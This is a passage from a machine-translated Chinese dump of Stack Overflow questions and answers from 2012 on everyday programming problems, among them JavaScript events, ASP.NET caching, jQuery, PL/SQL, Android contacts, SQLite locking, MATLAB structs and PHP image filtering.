                + "ExceptionType: " + ExceptionType + " \r\n "
                + "StackTrace: " + StackTrace + " \r\n ";           
        }  
    } 
```

# javascript - javascript多个事件不触发

> ID：11866115
> 
> 赞同：2
> 
> 时间：2012-08-08T13:57:12.140
> 
> 标签：javascript, html

但是，我有一个 html 元素，它假设调用 3 个 JS 函数作为其 onchange 事件；它只会触发第一个功能。我很困惑为什么它不这样做。

```
<select id="dlist" onChange="func1(); func1(); func3()"/>

func1 = function(){
//code
}

func3 = function(){
//code
}

func2 = function(){
//code
} 
```

这个问题可能是什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-08T13:59:48.147

```
<select id="dlist" "onChange=func1(); func1(); func3()"/> 
```

您将整个属性用引号括起来。你要

```
<select id="dlist" onChange="func1(); func1(); func3()"/> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-08T13:59:51.627

试试`onChange="func1(); func1(); func3()"`。

移动报价。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-08-08T14:03:37.853

你可以试试这个

```
var slt= document.getElementById('dlist').onchange= func1; func1;func3 
```

或者

```
var slt= document.getElementById('dlist').onchange= myAll;

function myAll(){

func1();
func2();
func3();

} 
```

# asp.net - 通过缓存、ThreadStatic 等降低 ASP.NET 中的初始化频率

> ID：11866116
> 
> 赞同：4
> 
> 时间：2012-08-08T13:57:14.653
> 
> 标签：asp.net, performance, caching, thread-safety

我想跨多个并发 ASP.NET 请求使用非线程安全编码器实例池，而无需重新初始化它们。如果我不关心初始化成本，我会这样做：

```
public class ResultController {
    public JsonResult GetResults() {
        List<MyViewModel> items = new List<MyViewModel>();
        // It obviously does more than this in real life
        for(id = 0; id < 1000; id++) {
            items.Add(new MyViewModel(id));
        }
        return Json(items);
    }
}

public class MyViewModel() {
    public string CodedId { get; set; }
    public MyViewModel(int id) {
        // This "new" is the concern
        CodedId = new ExpensiveToInitializeCodec().InexpensiveEncode(id);
    }
} 
```

工作正常。所有本地人，不用担心线程，在我的模型之外没有人需要了解值是编码的。然而，一个快速的性能测试表明，每次初始化大约需要 0.129 毫秒，而编码本身需要不到 0.006 毫秒。（仅供参考，编解码器是 TripleDESCryptoServiceProvider）。

我想限制初始化成本而不传递预先初始化的对象（例如进入构造函数以提高性能，但破坏关注点分离）。这是我目前所做的，显然在这个简单的例子之外它变得混乱：

```
public class ResultController {
    public JsonResult GetResults() {
        List<MyViewModel> items = new List<MyViewModel>();
        ExpensiveToInitializeCodec codec = new ExpensiveToInitializeCodec();
        for(id = 0; id < 1000; id++) {
            items.Add(new MyViewModel(id, codec));
        }
        return Json(items);
    }
}

public class MyViewModel() {
    public string CodedId { get; set; }
    public MyViewModel(int id, ExpensiveToInitializeCodec codec) {
        CodedId = codec.InexpensiveEncode(id);
    }
} 
```

我可以利用著名的 ASP.NET 每个请求缓存模式：

```
public class MyViewModel() {
    public string CodedId { get; set; }
    public MyViewModel(int id) {
        CodedId = ExpensiveToInitializeCodec.Get().InexpensiveEncode(id);
    }
}

public class ExpensiveToInitializeCodec {
    public static ExpensiveToInitializeCodec Get() {
        ExpensiveToInitializeCodec codec = HttpContext.Current.Items["codec"];
        if (codec == null) {
            codec = new ExpensiveToInitializeCodec();
            HttpContext.Current.Items["codec"] = codec;
        }
        return codec;
    }
} 
```

但是在一个紧密的循环中运行仍然很浪费：[HttpContext.Current 调用背后有多少计算？](https://stackoverflow.com/questions/290927/how-much-computation-is-behind-a-httpcontext-current-call)

似乎每个线程的解决方案可能比每个请求的解决方案更精确。任何与 ASP.NET 请求兼容的建议？

在 ASP 之外但仍在 .NET 空间中，一个人的答案是 ThreadStatic：[使用 ThreadStatic 替换昂贵的本地人——好主意吗？](https://stackoverflow.com/questions/4864974/using-threadstatic-to-replace-expensive-locals-good-idea). 但是，[http://blog.idm.fr/2010/03/aspnet-thread-agility-or-why-threadstatic-should-not-be-used.html](http://blog.idm.fr/2010/03/aspnet-thread-agility-or-why-threadstatic-should-not-be-used.html)显然排除了 ASP.NET 中的解决方案。与我的类似问题[有没有办法模仿 ThreadStatic 与 HttpContext.Current.Items 一起使用？](https://stackoverflow.com/questions/6122034/is-there-any-way-to-imitate-threadstatic-for-use-with-httpcontext-current-items)没有回答。

编辑：如果我确保我的编解码器使用不与 I/O 操作交错，我似乎可以使用 ThreadStatic，但我不确定这有多安全。

我现在达到了，但我想到的其他一些方法包括 1）为具有 EncodedAttribute 的项目提供自定义序列化/反序列化，2）实现我自己的静态 TripleDES 单块加密器，没有实例初始化开销，3）反对我的偏好，将外部初始化的加密器传递给每个项目的构造函数，4）实现 IEncryptable 接口并在填充结果后重新枚举项目，5）执行视图模型外部的所有加密，在使用视图模型的任何地方都实现.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T21:23:19.440

访问 HttpContext.Current.Items 的性能成本真的是一个问题，还是您只是在猜测？根据你给出的数字和你给出的问题中的数字，然后是链接问题中的数字，它不应该是： - 单次初始化需要 129 毫秒 + 1000 次迭代需要 6 毫秒 - HttpContext 在 10K 迭代中需要 0.1 毫秒（即0.01 在你的情况下）

线程静态是一个坏主意。虽然它可能会起作用，但您将来将无法使用异步控制器和类似功能。

# jquery - 基于复选框隐藏/显示 div - 淡入淡出

> ID：11866119
> 
> 赞同：1
> 
> 时间：2012-08-08T13:57:32.047
> 
> 标签：jquery

我对 jQuery 很陌生。以前从未真正使用过它。我的复选框有这个 HTML 片段：

```
<h4>Caterories</h4>
         <ul>
          <fieldset id="events">
              <li>    
                <input name="" type="checkbox" value="annual" checked="checked" />   
                Annual Events</li>    
              <li>   
                <input name="" type="checkbox" value="business" checked="checked"/>    
                Business Development, Marketing & Management</li>    
                <li>    
                <input name="" type="checkbox" value="enviro" checked="checked"/>
                Environment, Health & Safety</li>                  
              <li>    
                <input name="" type="checkbox" value="hr" checked="checked"/>
                Human Resources</li>
              <li>    
                <input name="" type="checkbox" value="it" checked="checked"/>    
                Information Technology</li>                     
              <li>    
                <input name="" type="checkbox" value="trans" checked="checked"/>
                Transportation</li>
           </fieldset>
          </ul> 
```

我有我的 jquery 片段：

```
<script language="JavaScript">

$(document).ready(function() {

    $(".topnav").accordion({
        accordion:'true',
        speed: 500,
        closedSign: '',
        openedSign: ''
    });

    $("events").click(function(){
        alert("HI");
       var pClass = '.'+$(this).val();
       if ($(this).is(':checked')) {
             $(pClass).fadeIn();
             $(pClass).show();
          } else {
              $(pClass).fadeOut();
              $(pClass).hide();
          }
    })

});

</script> 
```

有一个对应于复选框类别的事件列表：

```
<div class="news_box hr">
   <div class="date">01<br /> 
   Jan.<br /><br>
</div>

<div class="news_box annual">
   <div class="date">02<br /> 
   Jan.<br /><br>
</div>

<div class="news_box it">
   <div class="date">12<br /> 
   Jan.<br /><br>
</div>
<div class="news_box hr">
   <div class="date">20<br /> 
   Jan.<br /><br>
</div> 
```

恐怕我的点击功能在错误的地方，它没有被复选框检查触发。有什么建议么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T14:00:02.903

改变：

```
$("events").click(function(){ 
```

到：

```
$("#events input:checkbox").click(function(){ 
```

注意：“事件”之前的点正确表示 id。

**更新**
这是更正确的做法：

```
$("#events input:checkbox").on('click', function(){ ... 
```

请参阅：[.on('click') 与 .click() 之间的区别](https://stackoverflow.com/questions/9122078/difference-between-onclick-vs-click)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-08T14:02:54.600

```
$("#events > li > input").click(function(){

    // Your code

}) 
```

或者您可以为每个输入字段添加类并直接分配点击功能。

```
$(".inputclass").click(function(){

    // Your code

}) 
```

# sql - 如何创建可以选择使用哪些属性的过程

> ID：11866125
> 
> 赞同：0
> 
> 时间：2012-08-08T13:58:17.770
> 
> 标签：sql, plsql, procedure

例如，我将创建此过程

```
Create procedure MyProc (name varchar2:='', married varchar2:='', surname varchar2:='') IS
...
...
...
END; 
```

现在我想有时像这样使用它

```
MyProc (name=>'George', married=>'NO'); 
```

有时我需要像这样使用它

```
MyProc (name=>'Warren', surname=>'Palas'); 
```

有时我需要像这样使用它......

```
MyProc (name=>'Joey', married=>'YES', surname=>'BigJoey'); 
```

我怎样才能获得这个身份？感谢您的每一个建议

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T14:34:16.813

如下指定您的过程并像您已经完成的那样使用“=>”方法调用应该可以实现这一点。

```
PROCEDURE MyProc (name IN yourtable.name%type, 
married IN yourtable.married%type := NULL,
surname IN yourtable.surname%type := NULL) 
```

通过默认规范中的参数，它使参数成为“可选参数”。没有默认值的参数称为必需参数。

您还可以在包中指定您的过程并重载它。重载一个过程意味着在同一个包中创建多个同名的过程。过程的调用方式决定了*实际*执行的过程。

决定走哪条路可以取决于每种呼叫类型所需的处理之间的不同程度。通常，重载是代码抽象、结构化和维护目的的良好实践。

# xml - 尝试在 ASP 中保存 XML 时出现 msxml3.dll 错误“80070005”

> ID：11866126
> 
> 赞同：0
> 
> 时间：2012-08-08T13:58:25.747
> 
> 标签：xml, asp-classic

当我尝试保存文件时出现错误。我能做些什么？

```
 <%
    response.write("Hello World!")
    set xmlSave=Server.CreateObject("Microsoft.XMLDOM")
        xmlSave.async=false
        xmlSave.loadXML("test Text")

        xmlSave.Save("test.xml")
    %> 
```

# tridion - 类型不匹配：SiteEdit.ComponentPresentation

> ID：11866128
> 
> 赞同：0
> 
> 时间：2012-08-08T13:58:45.550
> 
> 标签：tridion

我们正在使用 Tridion 5.3。最近我们设置了新的 Content Manager 服务器和 Content Delivery 服务器 (5.3)。

当我们尝试发布页面时，页面因错误而失败。

> 呈现页面时出现错误 13：类型不匹配：“SiteEdit.ComponentPresentation”（来源：sLeft = sLeft & SiteEdit.ComponentPresentation(objCP, sMoveLeftRail)）。

我们已经安装了 SiteEdit。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-08T14:05:26.627

如果您的 SiteEdit 版本已针对不同的 Tridion 版本进行编译，则通常会发生此错误。因此，您需要确保安装了与 5.3 兼容的正确版本的 SiteEdit。

# jquery - 引导下拉菜单在 iOS 上不起作用

> ID：11866132
> 
> 赞同：3
> 
> 时间：2012-08-08T13:59:15.683
> 
> 标签：jquery, drop-down-menu, menu, web, twitter-bootstrap

对于一个客户网站，我制作了一个带有下拉菜单的引导菜单。在 Safari、Firefox 等中一切似乎都运行良好。但是当我尝试在 iPhone/iPad 上查看下拉项目时，它无法正常工作。有人明白为什么吗？

这是菜单的（网站只包含菜单）链接：[http ://www.buzz-creative.nl/_klanten/menutest](http://www.buzz-creative.nl/_klanten/menutest)

提前致谢！

梅丽莎

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-08T15:22:54.083

即使您的链接没有要遵循的 href，您仍然需要为它们提供一些东西才能工作，所以只需将类似的东西`href="#"`插入您的下拉链接中以表示它们实际上是链接。

# compiler-errors - Apache camel-类型必须实现继承的抽象方法错误

> ID：11866144
> 
> 赞同：0
> 
> 时间：2012-08-08T14:00:01.533
> 
> 标签：compiler-errors, port, apache-camel, abstract

我已经在骆驼周围寻找了很长一段时间了。我已经编写了一小段代码，它将端口 8080 上的所有传入请求转发到两台服务器 vmxp22-sat-1:8080 和 vmxp22-sat-1:8080

```
import java.util.List;

import org.apache.camel.AsyncCallback;
import org.apache.camel.Exchange;
import org.apache.camel.Processor;
import org.apache.camel.builder.RouteBuilder;
import org.apache.camel.Endpoint;
import org.apache.camel.processor.loadbalancer.LoadBalancer;

public class Test implements LoadBalancer  {

    protected RouteBuilder createRouteBuilder() {
        return new RouteBuilder() {
            public void configure() {
                // START SNIPPET: e1
                from("jetty://http://localhost:8080")
                .loadBalance().roundRobin()
                .to("http://vmxp22-sat-1:8080",
                    "http://vmxp22-sat-2:8080");
                // END SNIPPET: e1

            }
        };
    }
} 
```

但是当我在eclipse上编译它时出现以下错误

```
The type Test must implement the inherited abstract method AsyncProcessor.process(Exchange, AsyncCallback)  Test.java   /first_camel/src/main/java/com/mycompany/first_camel    line 24 Java Problem
The type Test must implement the inherited abstract method LoadBalancer.addProcessor(Processor) Test.java   /first_camel/src/main/java/com/mycompany/first_camel    line 24 Java Problem
The type Test must implement the inherited abstract method LoadBalancer.getProcessors() Test.java   /first_camel/src/main/java/com/mycompany/first_camel    line 24 Java Problem
The type Test must implement the inherited abstract method LoadBalancer.removeProcessor(Processor)  Test.java   /first_camel/src/main/java/com/mycompany/first_camel    line 24 Java Problem
The type Test must implement the inherited abstract method Processor.process(Exchange)  Test.java   /first_camel/src/main/java/com/mycompany/first_camel    line 24 Java Problem 
```

由于我对 Java 和 Camel 都不熟悉，因此我发现很难对其进行整理。

任何建议或帮助将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-08T15:58:36.983

你的类应该实现RouteBuilder，而不是LoadBalancer ...

有关详细信息，请参见[http://camel.apache.org/routes.html](http://camel.apache.org/routes.html)

# javascript - 使用 JQuery 隐藏具有相同表 id 的没有数据的列（包括标题）

> ID：11866148
> 
> 赞同：0
> 
> 时间：2012-08-08T14:00:05.027
> 
> 标签：javascript, jquery, html, xslt

我有一个基于元素属性创建 HTML 表的 xslt 模板。模板将表标识为`detailTable`. 我可以有几个具有相同 ID 的表。我正在使用 jQuery 来隐藏包含`TH`s 且没有数据的列。我的问题是如何让 jQuery 找到每个表。我可以让以下代码在一张桌子上工作，但如果有不止一张桌子，它就不起作用。jQuery代码如下：

```
$(document).ready(function() {
    $('#detailTable th').each(function(i) {
        var remove = 0;                           
        var tds = $(this).parents('table').find('tr td:nth-child(' + (i + 1) + ')')
        tds.each(function(j) { if (this.innerHTML == '') remove++; });

        if (remove == ($('#detailTable tr').length - 1)) {
            $(this).hide();
            tds.hide();
        }                           
    });
}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T14:03:27.043

为什么会有多个具有相同 ID 的表？试着给他们上课，然后你可以这样做：

```
$('.detailTable th').each(function(i) {
    // code here...
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-08T14:05:23.823

问题可能是您有多个具有相同 ID 的表。那是不行的。而不是使用`id`属性，使用`name`并更改`$('#detailTable th')`为`$('table[name=detailTable] th')`

**编辑：**

由于您的 XSLT 定义了需要使用的 ID，因此我能想到的所有尝试（如果您不能修改您的 XSLT）就是以其他方式引用您的表。在您使用它时删除他们的 ID 可能是个好主意 - 或者将它们更改为`name`属性，如下所示：

```
$(document).ready(function() {
    $('table th').each(function(i) {
        var tbl = $(this).closest("table");
        if(tbl.attr("id") == "detailTable") {
            tbl.removeAttr("id").attr("name", "detailTable");
            var remove = 0;                           
            var tds = $(this).parents('table').find('tr td:nth-child(' + (i + 1) + ')')
            tds.each(function(j) { if (this.innerHTML == '') remove++; });

            if (remove == ($('#detailTable tr').length - 1)) {
                $(this).hide();
                tds.hide();
            }                           
        }
    });
}); 
```

请注意，我刚刚在 SO 编辑器中编写了此代码，因此可能需要进行一些调整，但您应该明白这一点。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-08T14:08:43.777

我相信这是因为您有许多具有相同 ID 的表。

将 id 更改为 class 并尝试一下。

你真的不应该多次使用同一个 id。

# html - 无法获得想要的 CSS 过渡效果

> ID：11866149
> 
> 赞同：1
> 
> 时间：2012-08-08T14:00:12.070
> 
> 标签：html, css, css-transitions

我在这里准备了一个小提琴：

[http://jsfiddle.net/JGFFd/25/](http://jsfiddle.net/JGFFd/25/)

我的目标是，当悬停在彩色框上时，彩色框和头像向左移动，以便彩色框变大并显示`inner`跨度中包含的文本。

这听起来很简单，但我似乎无法解决，所以任何帮助将不胜感激。

这是小提琴中的代码副本：

```
<div class="blog-posts-grid-box">
    <div class="blog-posts-grid-box-content" id="grid-box0" data-id="id-0">                   
        <h3 class="grid-blog-title">Title</h3>
        <div class="blog-posts-grid-box-excerpt">Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do...</div>    
    </div> <!-- blog-posts-grid-box-content -->

    <div class="blog-posts-grid-box-pic">
        <img src="http://cdn2.iconfinder.com/data/icons/humano2/128x128/apps/comix.png" class="photo">
        <a href="#" target="_top">                      
            <span class="food">
                <span class="inner">Martin Carlin - Food</span>
            </span>
        </a>
    </div> <!-- blog-posts-grid-box-pic -->
</div>

.blog-posts-grid-box {
    float: left;
    background-color: white;
    width: 218px;
    height: 223px;
    padding: 10px 0 0 24px;
    margin-right: 11px;
    margin-bottom: 15px;
    overflow: hidden;
    border: 1px solid #333;
}

.blog-posts-grid-box-content {
    width: 195px;
    height: 145px;
}

.blog-posts-grid-box-excerpt {
    margin-top: 10px;
    height: 30px;
    font-size: 13px;
}

h3.grid-blog-title {
    font-weight: bold;
    color: #24212A;
    font-size: 16px;
}

.blog-posts-grid-box-pic {
    position: relative;
    bottom: -32px;
    right: -115px;
    -webkit-transition: width 1s ease-in-out, visibility 1s linear;
    -moz-transition: width 1s ease-in-out, visibility 1s linear;
    -o-transition: width 1s ease-in-out, visibility 1s linear;
    transition: width 1s ease-in-out, visibility 1s linear;
}

.blog-posts-grid-box-pic img {
    width: 52px;
    height: 52px;
    margin-right: -4px;
}

.blog-posts-grid-box-pic span.food {
    background-color: #FFA100;
}

.blog-posts-grid-box-pic span {
    height: 52px;
    width: 52px;
    display: inline-block;
    background: url('/wordpress/wp-content/plugins/wpbook/team21/images/blog-grid-chevron.png') no-repeat 23px 21px;
    top: -42px;
    position: relative;
}

.blog-posts-grid-box-pic .inner {
    display: inline-block;
    visibility: hidden;
    white-space: nowrap;
    width: 0%;
    overflow: hidden;
    color: white;
}

.blog-posts-grid-box-pic span:hover {
    width: 170px;
    visibility: visible;
    margin-left: -110px;
}

.blog-posts-grid-box-pic.inner span:hover {
    visibility: visible;
} 
```

​ ​</p>

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-08T14:19:19.627

你在这里问什么，我有点困惑。这是我从你的 jsFiddle 拼凑而成的：http: [//jsfiddle.net/JGFFd/26/](http://jsfiddle.net/JGFFd/26/)

我已经切换了 and 的位置，`<img />`因此`<a />`头像会受到`.food`过渡的影响。我还`span`使用类名替换了 css 选择器。我认为这是您遇到大部分问题的地方。

如果这不是你想要的，请告诉我，我会再做一次！

:)

# android - 在旋转的画布上绘制多条线时，TextView 消失

> ID：11866151
> 
> 赞同：1
> 
> 时间：2012-08-08T14:00:12.553
> 
> 标签：android, view, textview, android-canvas

我在姜饼及以下（适用于蜂窝及以上）上遇到了一个非常奇怪的问题，当绘制到围绕 x 或 y 轴（3d 旋转）旋转的画布上时，具有超过 1 行文本的文本视图将完全消失那是）。一行文本一切正常，但即使在 1 度角上，文本上有 2 行也无法正常工作。

所以我的问题是，为什么会发生这种情况，是否有解决办法？我的备份计划是将文本绘制到未旋转的位图，然后将该位图绘制到旋转的画布上。

这就是我应用旋转的方式：

```
Matrix matrix = new Matrix();
Camera camera = new Camera();
camera.rotateX(30);
camera.getMatrix(matrix);

matrix.preTranslate(-getWidth() / 2, -getHeight() / 2);
matrix.postTranslate(getWidth() / 2, getHeight() / 2);

canvas.concat(matrix); 
```

# iphone - SQLite iphone中的数据库被锁定错误

> ID：11866154
> 
> 赞同：1
> 
> 时间：2012-08-08T14:00:26.040
> 
> 标签：iphone, sqlite

我正在使用 sqlite 并在数据库中插入值，但我得到 Database is locked 错误这是我的代码

```
-(void)addmoreDATADetails
{

    if(addStmt == nil) 
    {
        const char *sql = "insert into moreBankroll(MoreName) Values(?)";

        if(sqlite3_prepare_v2(database, sql, -1, &addStmt, NULL) != SQLITE_OK)
            NSAssert1(0, @"Error while creating add statement. '%s'", sqlite3_errmsg(database));
    }
    sqlite3_bind_text(addStmt, 1, [moreName UTF8String], -1, SQLITE_TRANSIENT);

    if(SQLITE_DONE != sqlite3_step(addStmt))
    {
        NSAssert1(0, @"Error while inserting data. '%s'", sqlite3_errmsg(database));
    }
    else
    {

        moreId=sqlite3_last_insert_rowid(database);
    }
    sqlite3_reset(addStmt);

    } 
```

如果我要添加

```
XYZAppDelegate *appDelegate = (XYZAppDelegate *)[UIApplication sharedApplication].delegate;
  dbPath =[appDelegate getDBPath];
    if (sqlite3_open([dbPath UTF8String], &database) == SQLITE_OK) 
```

这个在上面的函数中是说没有这样的表moreBankroll

此代码在另一个项目中运行良好，但在我的项目中运行良好，请帮助

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-08T14:17:31.523

您的数据库已锁定，因为其他线程/操作正在对其执行查询。在 iPhone 中使用 SQLite 非常痛苦，也许你应该考虑使用 FMDB 包装器重写它——它自己处理所有锁并查询数据。 [https://github.com/ccgus/fmdb](https://github.com/ccgus/fmdb)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-08T14:54:18.033

仅当您创建一些数据库操作并且在其中您开始另一个数据库操作时才会出现数据库锁定错误。如果有，请尝试分离出两个操作。这样做的原因是每次它创建一个事务，所以你得到这个错误。

希望，这个描述可以帮助你。

# matlab - 删除空结构字段 Matlab

> ID：11866157
> 
> 赞同：5
> 
> 时间：2012-08-08T14:00:37.873
> 
> 标签：matlab, structure, field

我面临以下问题：我有一系列结构，例如：

```
A.B(1,1).x = 'string'
A.B(1,1).y = 12
A.B(1,2).x = []
A.B(1,2).y = []
A.B(1,3).x = 'string2'
A.B(1,3).y = 4 
```

我想从这个结构中删除空的 2\. 行，以便最后我得到 (1,1) 和 (1,3) 的字段。我试图转换为单元格，删除然后返回结构，但这样我不得不重新输入字段名称。怎么可能呢？可以在不转换结构的情况下完成吗？

蒂亚！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-08T14:04:16.640

使用循环或[arrayfun](http://www.mathworks.nl/help/techdoc/ref/arrayfun.html)来确定哪些数组元素为空：

```
empty_elems = arrayfun(@(s) isempty(s.x) & isempty(s.y),A.B) 
```

返回：`[0 1 0]`

或者

```
empty_elems = arrayfun(@(s) all(structfun(@isempty,s)), A.B); 
```

它检查所有字段是否为空（使用[任何](http://www.mathworks.nl/help/techdoc/ref/any.html)而不是[全部](http://www.mathworks.nl/help/techdoc/ref/all.html)来检查是否有任何元素为空而不是全部）。

然后使用[逻辑索引](http://www.mathworks.nl/company/newsletters/articles/Matrix-Indexing-in-MATLAB/matrix.html)删除它们：

```
A.B(empty_elems) = []; 
```

在评论中完整解决您的问题：

```
% find array elements that have all fields empty:
empty_elems = arrayfun(@(s) all(structfun(@isempty,s)), A.B);

% copy non-empty elements to a new array `C`:
C = A.B(~empty_elems);

% find elements of C that have y field >3
gt3_elems = arrayfun(@(s) s.y<3,C);

% delete those form C:
C(gt3_elems) = []; 
```

逐步执行此代码并分析中间变量以了解发生了什么。这应该是相当清楚的。

# android - 如何获取 Android 联系人缩略图

> ID：11866165
> 
> 赞同：11
> 
> 时间：2012-08-08T14:01:21.867
> 
> 标签：android, listview, android-cursoradapter

我有一个`listview`适配器，我正在尝试以下`newView`方法：

```
@Override
    public View newView(Context context, Cursor cursor, ViewGroup parent) {

        final LayoutInflater inflater = LayoutInflater.from(context);
        View v = inflater.inflate(layout, parent, false);

        long contactId = Long.valueOf(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID))); 
        String contactName = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)); 
        boolean hasPhone = Boolean.parseBoolean(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))); 
        String thumbnailUri = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.PHOTO_THUMBNAIL_URI)); 

        TextView name_text = (TextView) v.findViewById(R.id.name_entry);
        if (name_text != null) {
            name_text.setText(contactName);
        }

        name_text.setTag(new Contact(contactId, hasPhone));

        ImageView thumbnail = (ImageView) v.findViewById(R.id.thumbnail);
        if (thumbnailUri != null) {
            thumbnail.setImageURI(Uri.parse(thumbnailUri));
        } else {
            thumbnail.setImageResource(R.drawable.ic_launcher);
        }

        return v;
    } 
```

但是当我尝试解析存储在 thumbnailUri 中的 Uri 时，我收到以下错误：

```
 08-09 01:58:38.619: I/System.out(1471): resolveUri failed on bad bitmap uri: content://com.android.contacts/contacts/1/photo 
```

我会以错误的方式解决这个问题吗？任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-08-08T14:21:22.533

```
private Uri getPhotoUriFromID(String id) {
    try {
        Cursor cur = getContentResolver()
                .query(ContactsContract.Data.CONTENT_URI,
                        null,
                        ContactsContract.Data.CONTACT_ID
                                + "="
                                + id
                                + " AND "
                                + ContactsContract.Data.MIMETYPE
                                + "='"
                                + ContactsContract.CommonDataKinds.Photo.CONTENT_ITEM_TYPE
                                + "'", null, null);
        if (cur != null) {
            if (!cur.moveToFirst()) {
                return null; // no photo
            }
        } else {
            return null; // error in cursor process
        }
    } catch (Exception e) {
        e.printStackTrace();
        return null;
    }
    Uri person = ContentUris.withAppendedId(
            ContactsContract.Contacts.CONTENT_URI, Long.parseLong(id));
    return Uri.withAppendedPath(person,
            ContactsContract.Contacts.Photo.CONTENT_DIRECTORY);
} 
```

这是您需要传递联系人 ID 的函数，您将获得可以在 imageview 中轻松设置的图像 URI。

使用此函数的响应 uri，如 imageView.setImageURI(uri)

希望它适用于您的代码。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2020-11-23T14:44:59.770

可能会帮助某人。把它留在这里。
这样您就可以通过联系人 ID 获取缩略图 uri。
在 Android API 28 上测试。

```
 ContentResolver cr = getContentResolver();
    String[] projection = new String[] {ContactsContract.Contacts.PHOTO_THUMBNAIL_URI};
    String where = ContactsContract.Contacts.NAME_RAW_CONTACT_ID = "?";
    String[] selectionArgs = {your_contact_id}
    Cursor cur = cr.query(ContactsContract.Data.CONTENT_URI, projection, where, selectionArgs, null);

    String thumbnailUri;
    if ((cur != null ? cur.getCount() : 0) > 0) {
        if (cur.moveToNext()) {
            thumbnailUri = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.PHOTO_THUMBNAIL_URI));
        }
    }
    if(cur!=null){
        cur.close();
    }
    return thumbnailUri; 
```

# html - 如何选择包装的 HTML 元素？

> ID：11866166
> 
> 赞同：3
> 
> 时间：2012-08-08T14:01:23.183
> 
> 标签：html, css, overflow, word-wrap

假设您有一个容器 (div) 和一堆嵌套的内联块或浮动 div。
[http://jsfiddle.net/D6PgE/](http://jsfiddle.net/D6PgE/)

```
.container { width : 300px; }
.inner     { width : 100px; }

<div class="container">
    <div class="inner"> 1 </div>
    <div class="inner"> 2 </div>
    <div class="inner"> 3 </div>
    <div class="inner"> 4 </div>
    <div class="inner"> 5 </div>
    <div class="inner"> 6 </div>
    <div class="inner"> 7 </div>
    <div class="inner"> 8 </div>
    <div class="inner"> 9 </div>
</div> 
```

***选择已包装的元素的最佳方法是什么？*** 是否可以选择*包裹行的第 n 个元素*（在小提琴中它将是奇数）。

*唯一能想到的就是用JS，比较元素的offsetTop位置；但是我最近没有跟上 CSS 并且知道它变得越来越强大，那么有 CSS 解决方案吗？-谢谢*

* * *

**编辑**
我正在尝试选择“行”的第 n 个元素。问题是没有行，因为这不是表。我还应该补充一点，我的示例很简单，因为宽度可能非常大，因此每行可能有更多或元素 - 因此类似的东西`nth-child`不起作用

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-08T14:07:18.510

不，没有适用于未知/动态尺寸的 CSS 解决方案，因为选择器无法根据元素的布局方式或样式的计算方式进行选择。

您将需要使用 JS 来获取和使用此类信息。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-08-08T14:12:56.123

一个简单的 CSS3 解决方案是使用 `nth-child` 选择器。我已经用几个例子[http://jsfiddle.net/D6PgE/6/](http://jsfiddle.net/D6PgE/6/)更新了你的小提琴。

如需进一步参考：[http ://www.w3schools.com/cssref/sel_nth-child.asp](http://www.w3schools.com/cssref/sel_nth-child.asp)

# php - 根据大小过滤网页中的图像

> ID：11866167
> 
> 赞同：1
> 
> 时间：2012-08-08T14:01:26.603
> 
> 标签：php

我想列出来自任何特定网页的所有图像，但只想列出那些尺寸大于 10kb 的图像。我正在使用此代码列出列出该特定页面的所有图像的图像，但我不想列出大小的图像小于 10 kb

```
$url="http://example.com";

$html = file_get_contents($url);

$doc = new DOMDocument();
@$doc->loadHTML($html);

$tags = $doc->getElementsByTagName('img');

foreach ($tags as $tag) {
   echo $tag->getAttribute('src');
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-08T14:09:19.213

PHP有一个`filesize()`返回大小的函数，`bytes`可以这样使用：

```
echo "The file size in KB is ".(filesize('image.png')/1024); 
```

唯一的问题是它不适用于远程文件。

所以，你可以：

1.  将每个图像保存到临时目录
2.  遍历它们并检查文件大小
3.  如果大小<10，删除它
4.  列出剩余的图像

*编辑*

正如 Blowski 所指出的，从 PHP 5.0 开始，它将与一些 URL 包装器一起使用，所以你应该没问题。

*编辑 2*

一些示例代码：

```
foreach ($tags as $tag) {
   if (file_exists($tag->getAttribute('src')) && filesize($tag->getAttribute('src')) >= 10240)
     echo $src;
   }
} 
```

*编辑 3*

我做了更多研究，发现[HTTP(S)](http://www.php.net/manual/en/wrappers.http.php)协议`stat`不支持。因此，您**必须**将文件保存到您自己的服务器上才能正常工作。

 ***编辑 4*

使用`get_headers()`方法而不是`filesize()`.

```
foreach ($tags as $tag) {
   $data = get_headers($tag->getAttribute('src'));
   if(($data["Content-Length"]/1024)>=10){
     echo $src;
   }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-08T14:16:15.623

试试这个：-

```
$img = get_headers("http://static.adzerk.net/Advertisers/2564.jpg", 1);
$imgbit = $img["Content-Length"]/1024;

echo "The file size in KB is ".$imgbit; 
```**

# c# - 无法获得要在 Silverlight TreeView 控件中填充的第三级分层数据模板

> ID：11866168
> 
> 赞同：1
> 
